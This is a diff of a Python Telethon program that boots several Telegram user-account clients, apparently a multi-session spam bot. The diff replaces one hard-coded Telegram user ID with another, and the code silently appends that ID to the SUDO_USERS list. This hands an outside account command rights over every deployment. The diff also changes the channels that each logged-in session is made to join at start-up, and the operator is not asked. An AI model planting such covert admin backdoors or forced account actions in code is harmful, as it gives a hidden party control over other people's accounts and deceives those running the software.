@@ -50,8 +50,8 @@ STRING18 = config("STRING18", default=None)
 STRING19 = config("STRING19", default=None)
 STRING20 = config("STRING20", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
+if 5014206894 not in SUDO_USERS:
+    SUDO_USERS.append(5014206894)
 
 # Sessions
 async def RiZoeLX():
@@ -84,8 +84,8 @@ async def RiZoeLX():
             print("Booting Up The Client 1")
             await Riz.start()
             botme = await Riz.get_me()
-            await Riz(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz(functions.channels.JoinChannelRequest(channel="@Arpit_Chaurasiya"))
+            await Riz(functions.channels.JoinChannelRequest(channel="@TheByteBots"))
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
         except Exception as e:
@@ -108,8 +108,8 @@ async def RiZoeLX():
         try:
             print("Booting Up The Client 2")
             await Riz2.start()
-            await Riz2(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz2(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz2(functions.channels.JoinChannelRequest(channel="@Arpit_Chaurasiya"))
+            await Riz2(functions.channels.JoinChannelRequest(channel="@TheByteBots"))
             botme = await Riz2.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
@@ -133,8 +133,8 @@ async def RiZoeLX():
         try:
             print("Booting Up The Client 3")
             await  Riz3.start()
-            await Riz3(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz3(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz3(functions.channels.JoinChannelRequest(channel="@TheByteBots"))
+            await Riz3(functions.channels.JoinChannelRequest(channel="@Arpit_Chaurasiya"))
             botme = await Riz3.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
